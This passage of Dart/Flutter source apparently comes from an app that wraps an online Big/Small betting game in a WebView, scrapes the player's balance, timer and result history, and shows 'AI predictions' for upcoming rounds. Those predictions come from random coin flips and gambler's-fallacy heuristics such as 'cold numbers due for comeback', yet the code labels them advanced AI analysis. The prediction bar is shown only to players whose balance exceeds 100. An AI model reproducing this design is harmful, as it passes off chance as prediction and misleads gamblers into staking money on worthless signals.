      String jsonString = result.toString();

      // Remove outer quotes if they exist (WebView sometimes adds them)
      if (jsonString.startsWith('"') && jsonString.endsWith('"')) {
        jsonString = jsonString.substring(1, jsonString.length - 1);
        // Unescape any escaped quotes
        jsonString = jsonString.replaceAll('\\"', '"');
      }

      final data = jsonDecode(jsonString);

      if (mounted) {
        setState(() {
          if (data['wallet'] != 'N/A') {
            _walletBalance = data['wallet'];
            final balance = double.tryParse(data['wallet']
                    .toString()
                    .replaceAll('₹', '')
                    .replaceAll(',', '')) ??
                0.0;
            bool shouldShowPredictionBar = balance > 100;

            // If prediction bar is becoming visible for the first time, generate predictions
            if (!_showPredictionBar &&
                shouldShowPredictionBar &&
                _next5Predictions.isEmpty) {
              _initializePredictions();
            }
            _showPredictionBar = shouldShowPredictionBar;
          }

          if (_gameTimer != data['timer'] && data['timer'] != 'N/A') {
            _updatePrediction();

            // Track timer changes
            final timerSeconds = int.tryParse(data['timer']) ?? 0;
            _lastAnnouncedTimer = timerSeconds;

            print(
                "Timer changed to: ${data['timer']}, predictions updated: $_next5Predictions");
          }
          _gameTimer = data['timer'] != 'N/A' ? data['timer'] : "Not Found";

          // Only update period if we get a valid one, otherwise keep the last known period
          if (data['period'] != 'N/A' && data['period'].toString().isNotEmpty) {
            String newPeriod = data['period'];

            // Check if period has actually changed
            if (_lastKnownGamePeriod.isNotEmpty &&
                _lastKnownGamePeriod != newPeriod &&
                !_isFirstPeriodLoad) {
              print(
                  "🔄 PERIOD CHANGED: '$_lastKnownGamePeriod' → '$newPeriod'");
              print("🎯 Sliding predictions...");

              // Slide predictions: remove top, add new at bottom
              _slidePredictions();
            }

            String oldPeriod = _gamePeriod;
            _gamePeriod = newPeriod;
            _lastKnownGamePeriod = newPeriod;
            _isFirstPeriodLoad = false;

            print("🔍 Period updated from '$oldPeriod' to '$_gamePeriod'");
          } else {
            print("🔍 Period not updated - validation failed:");
            print("   data['period']: '${data['period']}'");
            print("   data['period'] != 'N/A': ${data['period'] != 'N/A'}");
            print(
                "   data['period'].toString().isNotEmpty: ${data['period'].toString().isNotEmpty}");
            print("   Keeping previous: '$_gamePeriod'");
          }

          // Add debugging for period
          print("🔍 Period debugging:");
          print("   Raw period from JS: '${data['period']}'");
          print("   Final _gamePeriod: '$_gamePeriod'");
          print(
              "   Is period valid number? ${RegExp(r'^\d+$').hasMatch(_gamePeriod)}");

          // Test if we're getting any data at all
          print("🔍 Data received from JavaScript:");
          print("   Wallet: '${data['wallet']}'");
          print("   Timer: '${data['timer']}'");
          print("   Period: '${data['period']}'");
        });
      }
    } catch (e) {
      // Silent error handling
    }
  }

  Future<void> _fetchBasicGameData() async {
    try {
      // Check if WebView is ready
      if (!_isUrlLoaded || !mounted) return;

      final basicScript = """
      (() => {
        try {
          const timerElement = document.querySelector('.TimeLeft__C-name');
          
          let gameTimer = '30';
          if (timerElement) {
            const match = timerElement.textContent.match(/\\d+/);
            if (match) {
              gameTimer = parseInt(match[0]).toString().padStart(2, '0');
            }
          }
          
          let gamePeriod = 'N/A';
          
          // Try multiple selectors for period
          const periodSelectors = [
            'div[data-v-3cbad787=""].TimeLeft__C-id', // Exact selector provided by user
            'div[data-v-3cbad787].TimeLeft__C-id',
            '.TimeLeft__C-id',
            '[class*="TimeLeft"][class*="id"]',
            '[class*="period"]',
            '[class*="Period"]',
            '[class*="game"]',
            '[class*="round"]',
            '[class*="number"]',
            '[class*="Number"]',
            '.game-period',
            '.period-number',
            '.round-number'
          ];
          
          for (let i = 0; i < periodSelectors.length; i++) {
            const elements = document.querySelectorAll(periodSelectors[i]);
            for (let j = 0; j < elements.length; j++) {
              const text = elements[j].innerText || elements[j].textContent || '';
              if (text.match(/^\\d{17}\$/)) {
                gamePeriod = text.trim();
                console.log('Basic script - Period found:', gamePeriod);
                break;
              }
            }
            if (gamePeriod !== 'N/A') break;
          }
          
          // If still not found, try a simple search for any 17-digit number
          if (gamePeriod === 'N/A') {
            const allElements = document.querySelectorAll('*');
            for (let k = 0; k < allElements.length; k++) {
              const el = allElements[k];
              const text = el.innerText || el.textContent || '';
              
              if (text.match(/^\\d{17}\$/)) {
                gamePeriod = text.trim();
                console.log('Basic script - Found 17-digit period:', gamePeriod);
                break;
              }
            }
          }
          
          return JSON.stringify({
            timer: gameTimer,
            period: gamePeriod
          });
        } catch (e) {
          console.log('Error in basic script:', e);
          return JSON.stringify({
            timer: '30',
            period: 'N/A'
          });
        }
      })();
    """;

      final result =
          await _webViewController.runJavaScriptReturningResult(basicScript);
      final data = jsonDecode((result as String).replaceAll('"', ''));

      if (mounted) {
        setState(() {
          if (_gameTimer != data['timer'] && data['timer'] != 'N/A') {
            _updatePrediction();
          }
          _gameTimer = data['timer'] != 'N/A' ? data['timer'] : "Not Found";

          // Only update period if we get a valid one, otherwise keep the last known period
          if (data['period'] != 'N/A' && data['period'].toString().isNotEmpty) {
            String newPeriod = data['period'];

            // Check if period has actually changed
            if (_lastKnownGamePeriod.isNotEmpty &&
                _lastKnownGamePeriod != newPeriod &&
                !_isFirstPeriodLoad) {
              print(
                  "🔄 PERIOD CHANGED: '$_lastKnownGamePeriod' → '$newPeriod'");
              print("🎯 Sliding predictions...");

              // Slide predictions: remove top, add new at bottom
              _slidePredictions();
            }

            String oldPeriod = _gamePeriod;
            _gamePeriod = newPeriod;
            _lastKnownGamePeriod = newPeriod;
            _isFirstPeriodLoad = false;

            print("🔍 Period updated from '$oldPeriod' to '$_gamePeriod'");
          } else {
            print("🔍 Period not updated - validation failed:");
            print("   data['period']: '${data['period']}'");
            print("   data['period'] != 'N/A': ${data['period'] != 'N/A'}");
            print(
                "   data['period'].toString().isNotEmpty: ${data['period'].toString().isNotEmpty}");
            print("   Keeping previous: '$_gamePeriod'");
          }

          // Add debugging for basic script period
          print("🔍 Basic script period debugging:");
          print("   Raw period from basic JS: '${data['period']}'");
          print("   Final _gamePeriod: '$_gamePeriod'");
        });
      }
    } catch (e) {
      // Silent error handling
    }
  }

  void _updatePrediction() {
    print("🔄 _updatePrediction() called");

    final random = Random();
    final isBig = random.nextBool();

    _prediction = isBig ? "BIG" : "SMALL";
    _predictionColor = isBig ? Colors.yellow : Colors.lightBlue;

    // Generate next 5 predictions
    _next5Predictions =
        List.generate(5, (index) => Random().nextBool() ? "Big" : "Small");

    print("✅ Prediction updated:");
    print("   _prediction: $_prediction");
    print("   _next5Predictions: $_next5Predictions");
    print("   _next5Predictions.length: ${_next5Predictions.length}");

    // Force UI update
    if (mounted) {
      setState(() {});
      print("✅ setState() called after prediction update");
    }
  }

  Future<void> _checkForNewResults() async {
    try {
      const fetchLatestDataScript = """
          (() => {
            try {
              const firstRow = document.querySelector('.record-body .van-row');
              if (!firstRow) return 'NO_DATA';
              
              const numberElement = firstRow.querySelector('.record-body-num');
              const bigSmallElement = firstRow.querySelector('.van-col--5 span');
              const colorDiv = firstRow.querySelector('.record-origin');
          const periodElement = firstRow.querySelector('.van-col--10');
          
              let colors = [];
              if (colorDiv) {
                if (colorDiv.querySelector('.record-origin-I.red')) colors.push('red');
                if (colorDiv.querySelector('.record-origin-I.green')) colors.push('green');
                if (colorDiv.querySelector('.record-origin-I.violet')) colors.push('violet');
              }
              
          return JSON.stringify({
            number: numberElement ? numberElement.textContent.trim() : null,
            bigSmall: bigSmallElement ? bigSmallElement.textContent.trim() : null,
                colors: colors.join(' '),
            period: periodElement ? periodElement.textContent.trim() : null
          });
            } catch (e) {
          return 'ERROR';
            }
          })();
          """;

      final result = await _webViewController
          .runJavaScriptReturningResult(fetchLatestDataScript);
      final resultStr = (result as String).replaceAll('"', '');

      if (resultStr == 'ERROR' || resultStr == 'NO_DATA') return;

      final data = jsonDecode(resultStr);
      if (data is Map && data['number'] != null) {
        String currentNumber = data['number'].toString();
        String currentColors = data['colors']?.toString() ?? '';

        if (currentNumber.isNotEmpty && currentNumber != _lastResult) {
          int resultNumber = int.tryParse(currentNumber) ?? -1;
          if (resultNumber == -1) return;

          _processGameResult(resultNumber, currentColors, currentNumber);
        }
      }
    } catch (e) {
      // Silent error handling
    }
  }

  void _processGameResult(
      int resultNumber, String currentColors, String currentNumber) {
    // Update recent history with size limit
    _recentNumbers.insert(0, resultNumber);
    _recentColors.insert(0, currentColors);

    if (_recentNumbers.length > 10) {
      _recentNumbers.removeLast();
      _recentColors.removeLast();
    }

    bool isResultBig = resultNumber >= 5;
    bool predictedBig = _prediction.toUpperCase() == 'BIG';
    double reward =
        (isResultBig == predictedBig ? 1.0 : -1.0) * _lastConfidence;

    // Efficient AI learning
    PredictionState currentState =
        PredictionState(List.from(_recentNumbers), List.from(_recentColors));
    _ai.learn(currentState, predictedBig, reward);

    // Track result for analytics

    if (mounted) {
      setState(() {
        if (isResultBig == predictedBig) {
          _wins++;
        } else {
          _losses++;
        }
        _lastResult = currentNumber;
        _generateOptimizedPrediction();
      });
    }
  }

  void _generateOptimizedPrediction() {
    try {
      if (_recentNumbers.isEmpty) {
        _updateRandomPrediction();
        return;
      }

      // Optimized AI prediction
      PredictionState currentState =
          PredictionState(List.from(_recentNumbers), List.from(_recentColors));
      AIDecision aiDecision = _ai.predict(currentState);

      // Lightweight predictor result
      final predictor =
          AdvancedPredictor(_recentNumbers, _recentColors, _wins, _losses);
      final prediction = predictor.predict();

      // Simplified combination logic
      double combinedProbability =
          (aiDecision.bigProbability + prediction['probability']) / 2;
      double combinedConfidence =
          max(aiDecision.confidence, prediction['confidence']);

      // Performance-based AI reset (less frequent)
      if (_wins + _losses > 25 && _wins / (_wins + _losses) < 0.2) {
        _ai.resetLearning();
      }

      _prediction = combinedProbability > 0.5 ? "BIG" : "SMALL";
      _predictionColor =
          _prediction == "BIG" ? Colors.yellow : Colors.lightBlue;
      _lastConfidence = combinedConfidence;

      // Generate next 5 predictions with advanced AI analysis
      _generateNext5Predictions();

      // Log prediction for analytics
    } catch (e) {
      _updateRandomPrediction();
    }
  }

  Future<void> _generateNext5Predictions() async {
    print(
        "🧠 _generateNext5Predictions() called - Starting advanced AI analysis");

    try {
      // First, fetch complete game history for deep analysis
      final historyData = await _fetchCompleteGameHistory();
      print("📊 History data fetched: ${historyData.length} records");

      if (historyData.isEmpty) {
        print("⚠️ No history data available, using fallback predictions");
        _generateFallbackPredictions();
        return;
      }

      // Perform comprehensive analysis
      final analysisResult = await _performAdvancedAnalysis(historyData);
      print("🔬 Advanced analysis completed");

      _next5Predictions.clear();

      for (int i = 0; i < 5; i++) {
        print("🎯 Generating prediction ${i + 1}/5");

        // Multi-layer prediction system
        final prediction =
            await _generateSinglePrediction(i, historyData, analysisResult);
        _next5Predictions.add(prediction);

        print("   ✅ Prediction ${i + 1}: $prediction");
      }

      print("🎉 AI-generated predictions completed:");
      print("   _next5Predictions: $_next5Predictions");
    } catch (e) {
      print("❌ Error in advanced AI prediction: $e");
      _generateFallbackPredictions();
    }

    // Force UI update
    if (mounted) {
      setState(() {});
      print("✅ setState() called after generating advanced predictions");
    }
  }

  Future<List<Map<String, dynamic>>> _fetchCompleteGameHistory() async {
    try {
      final historyScript = """
      (() => {
        try {
          console.log('🔍 FETCHING COMPLETE GAME HISTORY...');
          
          var historyContainer = document.querySelector('div[data-v-e06f81fe].record-body');
          if (!historyContainer) {
            console.log('❌ History container not found');
            return JSON.stringify([]);
          }
          
          var historyRows = historyContainer.querySelectorAll('.van-row');
          console.log('Found ' + historyRows.length + ' history rows');
          
          var historyData = [];
          
          for (var i = 0; i < Math.min(historyRows.length, 50); i++) { // Get last 50 records
            var row = historyRows[i];
            
            // Get period number
            var periodElement = row.querySelector('.van-col--10');
            var period = periodElement ? periodElement.innerText.trim() : '';
            
            // Get result number
            var numberElement = row.querySelector('.record-body-num');
            var number = numberElement ? parseInt(numberElement.innerText.trim()) : -1;
            
            // Get big/small result
            var bigSmallElement = row.querySelector('.van-col--5 span');
            var bigSmall = bigSmallElement ? bigSmallElement.innerText.trim() : '';
            
            // Get colors
            var colorDiv = row.querySelector('.record-origin');
            var colors = [];
            if (colorDiv) {
              if (colorDiv.querySelector('.record-origin-I.red')) colors.push('red');
              if (colorDiv.querySelector('.record-origin-I.green')) colors.push('green');
              if (colorDiv.querySelector('.record-origin-I.violet')) colors.push('violet');
            }
            
            if (period && number >= 0) {
              historyData.push({
                period: period,
                number: number,
                bigSmall: bigSmall,
                colors: colors.join(' '),
                isBig: number >= 5,
                timestamp: Date.now() - (i * 30000) // Approximate timestamps
              });
            }
          }
          
          console.log('✅ Collected ' + historyData.length + ' history records');
          return JSON.stringify(historyData);
          
    } catch (e) {
          console.log('Error fetching complete history:', e);
          return JSON.stringify([]);
        }
      })();
    """;

      final result =
          await _webViewController.runJavaScriptReturningResult(historyScript);

      String jsonString = result.toString();
      if (jsonString.startsWith('"') && jsonString.endsWith('"')) {
        jsonString = jsonString.substring(1, jsonString.length - 1);
        jsonString = jsonString.replaceAll('\\"', '"');
      }

      final List<dynamic> rawData = jsonDecode(jsonString);
      return rawData.cast<Map<String, dynamic>>();
    } catch (e) {
      print("❌ Error fetching complete history: $e");
      return [];
    }
  }

  Future<Map<String, dynamic>> _performAdvancedAnalysis(
      List<Map<String, dynamic>> history) async {
    print("🔬 Performing advanced pattern analysis...");

    final analysis = <String, dynamic>{};

    // 1. Big/Small Pattern Analysis
    final bigSmallPattern = _analyzeBigSmallPatterns(history);
    analysis['bigSmallPattern'] = bigSmallPattern;
    print("   📈 Big/Small pattern strength: ${bigSmallPattern['strength']}");

    // 2. Number Frequency Analysis
    final numberFrequency = _analyzeNumberFrequency(history);
    analysis['numberFrequency'] = numberFrequency;
    print("   🔢 Most frequent numbers: ${numberFrequency['hotNumbers']}");

    // 3. Color Pattern Analysis
    final colorPattern = _analyzeColorPatterns(history);
    analysis['colorPattern'] = colorPattern;
    print("   🎨 Dominant color pattern: ${colorPattern['dominantPattern']}");

    // 4. Sequence Analysis
    final sequencePattern = _analyzeSequencePatterns(history);
    analysis['sequencePattern'] = sequencePattern;
    print("   🔄 Sequence pattern detected: ${sequencePattern['type']}");

    // 5. Time-based Analysis
    final timePattern = _analyzeTimePatterns(history);
    analysis['timePattern'] = timePattern;
    print("   ⏰ Time-based trend: ${timePattern['trend']}");

    // 6. Streak Analysis
    final streakAnalysis = _analyzeStreaks(history);
    analysis['streakAnalysis'] = streakAnalysis;
    print("   📊 Current streak: ${streakAnalysis['currentStreak']}");

    return analysis;
  }

  Map<String, dynamic> _analyzeBigSmallPatterns(
      List<Map<String, dynamic>> history) {
    if (history.isEmpty) return {'strength': 0.0, 'trend': 'neutral'};

    final recentBigCount =
        history.take(10).where((h) => h['isBig'] == true).length;
    final overallBigCount = history.where((h) => h['isBig'] == true).length;

    final recentBigRatio = recentBigCount / 10.0;
    final overallBigRatio = overallBigCount / history.length;

    final trendStrength = (recentBigRatio - overallBigRatio).abs();

    String trend = 'neutral';
    if (recentBigRatio > overallBigRatio + 0.2) {
      trend = 'big_trending';
    } else if (recentBigRatio < overallBigRatio - 0.2) {
      trend = 'small_trending';
    }

    return {
      'strength': trendStrength,
      'trend': trend,
      'recentBigRatio': recentBigRatio,
      'overallBigRatio': overallBigRatio,
    };
  }

  Map<String, dynamic> _analyzeNumberFrequency(
      List<Map<String, dynamic>> history) {
    final frequency = <int, int>{};

    for (final record in history) {
      final number = record['number'] as int;
      frequency[number] = (frequency[number] ?? 0) + 1;
    }

    final sortedFreq = frequency.entries.toList()
      ..sort((a, b) => b.value.compareTo(a.value));

    final hotNumbers = sortedFreq.take(3).map((e) => e.key).toList();
    final coldNumbers = sortedFreq.reversed.take(3).map((e) => e.key).toList();

    return {
      'hotNumbers': hotNumbers,
      'coldNumbers': coldNumbers,
      'frequency': frequency,
    };
  }

  Map<String, dynamic> _analyzeColorPatterns(
      List<Map<String, dynamic>> history) {
    final colorFreq = <String, int>{};
    final colorSequences = <String>[];

    for (final record in history.take(20)) {
      final colors = record['colors'] as String;
      if (colors.isNotEmpty) {
        colorFreq[colors] = (colorFreq[colors] ?? 0) + 1;
        colorSequences.add(colors);
      }
    }

    final dominantColor = colorFreq.entries.isEmpty
        ? 'unknown'
        : colorFreq.entries.reduce((a, b) => a.value > b.value ? a : b).key;

    return {
      'dominantPattern': dominantColor,
      'frequency': colorFreq,
      'recentSequence': colorSequences.take(5).toList(),
    };
  }

  Map<String, dynamic> _analyzeSequencePatterns(
      List<Map<String, dynamic>> history) {
    if (history.length < 5) return {'type': 'insufficient_data'};

    final numbers = history.take(10).map((h) => h['number'] as int).toList();

    // Check for arithmetic progression
    bool isArithmetic = true;
    if (numbers.length >= 3) {
      final diff = numbers[1] - numbers[0];
      for (int i = 2; i < numbers.length; i++) {
        if (numbers[i] - numbers[i - 1] != diff) {
          isArithmetic = false;
          break;
        }
      }
    }

    // Check for alternating big/small pattern
    bool isAlternating = true;
    if (numbers.length >= 3) {
      for (int i = 2; i < numbers.length; i++) {
        final prev2Big = numbers[i - 2] >= 5;
        final prev1Big = numbers[i - 1] >= 5;
        final currentBig = numbers[i] >= 5;

        if (prev2Big == currentBig) {
          isAlternating = false;
          break;
        }
      }
    }

    String patternType = 'random';
    if (isArithmetic)
      patternType = 'arithmetic';
    else if (isAlternating) patternType = 'alternating';

    return {
      'type': patternType,
      'confidence': isArithmetic || isAlternating ? 0.8 : 0.3,
    };
  }

  Map<String, dynamic> _analyzeTimePatterns(
      List<Map<String, dynamic>> history) {
    if (history.length < 10) return {'trend': 'neutral'};

    final recent5 = history.take(5).map((h) => h['isBig'] as bool).toList();
    final previous5 =
        history.skip(5).take(5).map((h) => h['isBig'] as bool).toList();

    final recentBigCount = recent5.where((b) => b).length;
    final previousBigCount = previous5.where((b) => b).length;

    String trend = 'neutral';
    if (recentBigCount > previousBigCount + 1) {
      trend = 'increasing_big';
    } else if (recentBigCount < previousBigCount - 1) {
      trend = 'increasing_small';
    }

    return {
      'trend': trend,
      'recentBigCount': recentBigCount,
      'previousBigCount': previousBigCount,
    };
  }

  Map<String, dynamic> _analyzeStreaks(List<Map<String, dynamic>> history) {
    if (history.isEmpty) return {'currentStreak': 0, 'streakType': 'none'};

    final firstResult = history.first['isBig'] as bool;
    int streakLength = 1;

    for (int i = 1; i < history.length; i++) {
      if ((history[i]['isBig'] as bool) == firstResult) {
        streakLength++;
      } else {
        break;
      }
    }

    return {
      'currentStreak': streakLength,
      'streakType': firstResult ? 'big' : 'small',
      'shouldReverse': streakLength >= 4, // Suggest reversal after 4+ streak
    };
  }

  Future<String> _generateSinglePrediction(int index,
      List<Map<String, dynamic>> history, Map<String, dynamic> analysis) async {
    print("🎯 Generating prediction ${index + 1} with advanced analysis");

    double bigProbability = 0.5; // Base probability
    final reasons = <String>[];

    // 1. Apply Big/Small pattern analysis
    final bigSmallPattern = analysis['bigSmallPattern'] as Map<String, dynamic>;
    final patternStrength = bigSmallPattern['strength'] as double;
    final trend = bigSmallPattern['trend'] as String;

    if (patternStrength > 0.3) {
      if (trend == 'big_trending') {
        bigProbability += 0.2 * patternStrength;
        reasons.add('Big trending pattern detected');
      } else if (trend == 'small_trending') {
        bigProbability -= 0.2 * patternStrength;
        reasons.add('Small trending pattern detected');
      }
    }

    // 2. Apply streak analysis with counter-trend logic
    final streakAnalysis = analysis['streakAnalysis'] as Map<String, dynamic>;
    final currentStreak = streakAnalysis['currentStreak'] as int;
    final streakType = streakAnalysis['streakType'] as String;
    final shouldReverse = streakAnalysis['shouldReverse'] as bool;

    if (shouldReverse) {
      if (streakType == 'big') {
        bigProbability -= 0.3; // Counter-trend after long big streak
        reasons.add('Counter-trend after ${currentStreak} big streak');
      } else {
        bigProbability += 0.3; // Counter-trend after long small streak
        reasons.add('Counter-trend after ${currentStreak} small streak');
      }
    }

    // 3. Apply sequence pattern analysis
    final sequencePattern = analysis['sequencePattern'] as Map<String, dynamic>;
    final patternType = sequencePattern['type'] as String;
    final confidence = sequencePattern['confidence'] as double;

    if (patternType == 'alternating' && confidence > 0.7) {
      final lastResult =
          history.isNotEmpty ? history.first['isBig'] as bool : false;
      if (lastResult) {
        bigProbability -= 0.25; // Next should be small in alternating pattern
        reasons.add('Alternating pattern suggests small');
      } else {
        bigProbability += 0.25; // Next should be big in alternating pattern
        reasons.add('Alternating pattern suggests big');
      }
    }

    // 4. Apply number frequency analysis
    final numberFreq = analysis['numberFrequency'] as Map<String, dynamic>;
    final hotNumbers = numberFreq['hotNumbers'] as List<int>;
    final coldNumbers = numberFreq['coldNumbers'] as List<int>;

    final hotBigCount = hotNumbers.where((n) => n >= 5).length;
    final coldBigCount = coldNumbers.where((n) => n >= 5).length;

    if (hotBigCount > hotNumbers.length / 2) {
      bigProbability += 0.15;
      reasons.add('Hot numbers favor big');
    } else if (coldBigCount > coldNumbers.length / 2) {
      bigProbability -= 0.1;
      reasons.add('Cold numbers due for comeback');
    }

    // 5. Apply time-based analysis
    final timePattern = analysis['timePattern'] as Map<String, dynamic>;
    final timeTrend = timePattern['trend'] as String;

    if (timeTrend == 'increasing_big') {
      bigProbability += 0.1;
      reasons.add('Recent time trend favors big');
    } else if (timeTrend == 'increasing_small') {
      bigProbability -= 0.1;
      reasons.add('Recent time trend favors small');
    }

    // 6. Apply position-based adjustment (each prediction in sequence)
    final positionAdjustment = (index * 0.05) * (Random().nextBool() ? 1 : -1);
    bigProbability += positionAdjustment;

    // 7. Add slight randomization to avoid predictable patterns
    final randomFactor = (Random().nextDouble() - 0.5) * 0.1;
    bigProbability += randomFactor;

    // Clamp probability
    bigProbability = bigProbability.clamp(0.1, 0.9);

    final prediction = bigProbability > 0.5 ? "Big" : "Small";

    print("   🧮 Analysis for prediction ${index + 1}:");
    print("      Final probability: ${bigProbability.toStringAsFixed(3)}");
    print("      Prediction: $prediction");
    print("      Reasons: ${reasons.join(', ')}");

    return prediction;
  }

  void _generateFallbackPredictions() {
    print("🎲 Generating fallback predictions");
    _next5Predictions =
        List.generate(5, (index) => Random().nextBool() ? "Big" : "Small");
  }

  int _generateSimulatedResult(double bigProbability) {
    final random = Random();
    if (random.nextDouble() < bigProbability) {
      // Generate BIG number (5-9)
      return 5 + random.nextInt(5);
    } else {
      // Generate SMALL number (0-4)
      return random.nextInt(5);
    }
  }

  String _generateSimulatedColor(int number) {
    // Simple color logic based on number
    if (number == 0 || number == 5) {
      return Random().nextBool() ? "red violet" : "green violet";
    } else if ([1, 3, 7, 9].contains(number)) {
      return "green";
    } else if ([2, 4, 6, 8].contains(number)) {
      return "red";
    }
    return "violet";
  }

  void _updateRandomPrediction() {
    print("🎲 _updateRandomPrediction() called");

    final random = Random();
    final isBig = random.nextBool();
    _prediction = isBig ? "BIG" : "SMALL";
    _predictionColor = isBig ? Colors.yellow : Colors.lightBlue;

    // Generate random next 5 predictions
    _next5Predictions =
        List.generate(5, (index) => Random().nextBool() ? "Big" : "Small");

    print("✅ Random predictions generated:");
    print("   _prediction: $_prediction");
    print("   _next5Predictions: $_next5Predictions");

    // Force UI update
    if (mounted) {
      setState(() {});
      print("✅ setState() called after random prediction update");
    }
  }

  Future<void> _checkAppStatus() async {
    try {
      print("Starting app status check..."); // Debug log

      final remoteConfig = FirebaseRemoteConfig.instance;
      print("Remote config instance obtained"); // Debug log

      // Set default value first
      await remoteConfig.setDefaults({
        'is_app_enabled': false // Default to false for safety
      });
      print("Default values set"); // Debug log

      // Configure fetch settings
      await remoteConfig.setConfigSettings(RemoteConfigSettings(
        fetchTimeout: const Duration(seconds: 20), // Increased timeout
        minimumFetchInterval: Duration.zero,
      ));
      print("Config settings applied"); // Debug log

      // Fetch new values
      try {
        await remoteConfig.fetch();
        print("Remote config fetched"); // Debug log
      } catch (fetchError) {
        print("Fetch error: $fetchError");
        throw fetchError;
      }

      // Activate fetched values
      try {
        final activated = await remoteConfig.activate();
        print("Remote config activated: $activated"); // Debug log
      } catch (activateError) {
        print("Activation error: $activateError");
        throw activateError;
      }

      // Get the value
      final bool newAppState = remoteConfig.getBool('is_app_enabled');
      print("Retrieved is_app_enabled value: $newAppState"); // Debug log

      // Update state
      setState(() {
        _isAppEnabled = newAppState;
        print("App enabled state updated to: $_isAppEnabled"); // Debug log
      });
    } catch (e) {
      print("Fatal error in _checkAppStatus: $e");
      setState(() {
        _isAppEnabled = false; // Fail safe
        print("App disabled due to error"); // Debug log
      });
    }
  }

  Future<void> _testPeriodFetching() async {
    try {
      final testScript = """
      (() => {
        try {
          console.log('🔍 TESTING PERIOD FETCHING...');
          
          // Test the main selector
          var periodElement = document.querySelector('div[data-v-3cbad787=""].TimeLeft__C-id');
          console.log('Exact selector result:', periodElement);
          
          if (periodElement) {
            console.log('Period found with exact selector:', periodElement.innerText);
            console.log('Element class:', periodElement.className);
          } else {
            console.log('Exact selector failed, trying alternatives...');
            
            // Try alternative selectors
            var alternatives = [
              'div[data-v-3cbad787].TimeLeft__C-id',
              '.TimeLeft__C-id',
              '[class*="TimeLeft"]',
              '[class*="period"]',
              '[class*="Period"]',
              '[class*="game"]',
              '[class*="round"]',
              '[class*="number"]',
              '[class*="Number"]'
            ];
            
            for (var i = 0; i < alternatives.length; i++) {
              var el = document.querySelector(alternatives[i]);
              if (el) {
                console.log('Found with selector ' + alternatives[i] + ':', el.innerText);
                break;
              }
            }
          }
          
          // Debug: Show all elements with 17-digit numbers
          console.log('🔍 ALL ELEMENTS WITH 17-DIGIT NUMBERS:');
          var allElements = document.querySelectorAll('*');
          for (var k = 0; k < allElements.length; k++) {
            var el = allElements[k];
            var text = el.innerText || el.textContent || '';
            if (text.match(/^\\d{17}\$/)) {
              console.log('17-digit number found:', text, 'in element:', el.tagName, 'class:', el.className);
              console.log('Parent text:', el.parentElement ? el.parentElement.innerText : 'No parent');
            }
          }
          
          return 'TEST_COMPLETE';
        } catch (e) {
          console.log('Test error:', e);
          return 'TEST_ERROR';
        }
      })();
    """;

      final result =
          await _webViewController.runJavaScriptReturningResult(testScript);
      print("🔍 PERIOD TEST RESULT: $result");
    } catch (e) {
      print("❌ Period test error: $e");
    }
  }

  Future<void> _fetchCurrentPeriodFromHistory() async {
    try {
      if (!_isUrlLoaded || !mounted) return;

      final historyScript = """
      (() => {
        try {
          console.log('🔍 FETCHING CURRENT PERIOD FROM HISTORY...');
          
          // Look for the history records in the exact structure provided
          var historyContainer = document.querySelector('div[data-v-e06f81fe].record-body');
          if (!historyContainer) {
            console.log('❌ History container not found');
            return JSON.stringify({ currentPeriod: 'N/A', nextPeriod: 'N/A' });
          }
          
          console.log('✅ History container found');
          
          // Get all period numbers from history (first column of each row)
          var periodElements = historyContainer.querySelectorAll('.van-col--10');
          console.log('Found ' + periodElements.length + ' period elements');
          
          if (periodElements.length === 0) {
            console.log('❌ No period elements found');
            return JSON.stringify({ currentPeriod: 'N/A', nextPeriod: 'N/A' });
          }
          
          // Get the latest (first) period number
          var latestPeriod = periodElements[0].innerText.trim();
          console.log('Latest period from history: ' + latestPeriod);
          
          // Validate it's a 17-digit number
          if (!latestPeriod.match(/^\\d{17}\$/)) {
            console.log('❌ Latest period is not 17 digits: ' + latestPeriod);
            return JSON.stringify({ currentPeriod: 'N/A', nextPeriod: 'N/A' });
          }
          
          // Calculate the next period number (increment by 1)
          // Use BigInt for large 17-digit numbers to avoid precision loss
          var latestPeriodBigInt = BigInt(latestPeriod);
          var nextPeriodBigInt = latestPeriodBigInt + 1n;
          var nextPeriod = nextPeriodBigInt.toString();
          
          console.log('✅ Current period: ' + latestPeriod);
          console.log('✅ Next period: ' + nextPeriod);
          
          return JSON.stringify({
            currentPeriod: latestPeriod,
            nextPeriod: nextPeriod,
            historyCount: periodElements.length
          });
          
        } catch (e) {
          console.log('Error fetching period from history:', e);
          return JSON.stringify({ currentPeriod: 'N/A', nextPeriod: 'N/A' });
        }
      })();
    """;

      final result =
          await _webViewController.runJavaScriptReturningResult(historyScript);

      print("🔍 Raw JavaScript result: '$result'");
      print("🔍 Result type: ${result.runtimeType}");

      // The result is already a JSON string, just parse it directly
      String jsonString = result.toString();

      // Remove outer quotes if they exist (WebView sometimes adds them)
      if (jsonString.startsWith('"') && jsonString.endsWith('"')) {
        jsonString = jsonString.substring(1, jsonString.length - 1);
        // Unescape any escaped quotes
        jsonString = jsonString.replaceAll('\\"', '"');
      }

      print("🔍 Cleaned JSON string: '$jsonString'");

      final data = jsonDecode(jsonString);

      if (mounted && data['nextPeriod'] != 'N/A') {
        setState(() {
          String oldPeriod = _gamePeriod;
          _gamePeriod = data['nextPeriod']; // Use the next period as current
          print(
              "🔍 Period updated from history: '$oldPeriod' → '$_gamePeriod'");
          print("   Latest completed period: ${data['currentPeriod']}");
          print("   Current/Next period: ${data['nextPeriod']}");
          print("   History records found: ${data['historyCount']}");
        });
      } else {
        print("🔍 Could not fetch period from history:");
        print("   Current period: ${data['currentPeriod']}");
        print("   Next period: ${data['nextPeriod']}");
      }
    } catch (e) {
      print("❌ Error fetching period from history: $e");
    }
  }

  Future<void> _slidePredictions() async {
    print("🎯 _slidePredictions() called");

    if (_next5Predictions.isEmpty) {
      print("⚠️ No predictions to slide, generating new ones");
      await _generateNext5Predictions();
      return;
    }

    try {
      // Remove the top prediction (it was for the previous period)
      if (_next5Predictions.isNotEmpty) {
        String removedPrediction = _next5Predictions.removeAt(0);
        print("   🔺 Removed top prediction: '$removedPrediction'");
      }

      // Generate one new prediction for the bottom
      String newPrediction = await _generateSingleNewPrediction();
      _next5Predictions.add(newPrediction);
      print("   🔻 Added new bottom prediction: '$newPrediction'");

      print("✅ Predictions slided:");
      print("   Updated _next5Predictions: $_next5Predictions");
      print("   Total predictions: ${_next5Predictions.length}");

      // Force UI update to show the sliding effect
      if (mounted) {
        setState(() {});
        print("✅ setState() called after sliding predictions");
      }
    } catch (e) {
      print("❌ Error sliding predictions: $e");
      // If sliding fails, regenerate all predictions
      await _generateNext5Predictions();
    }
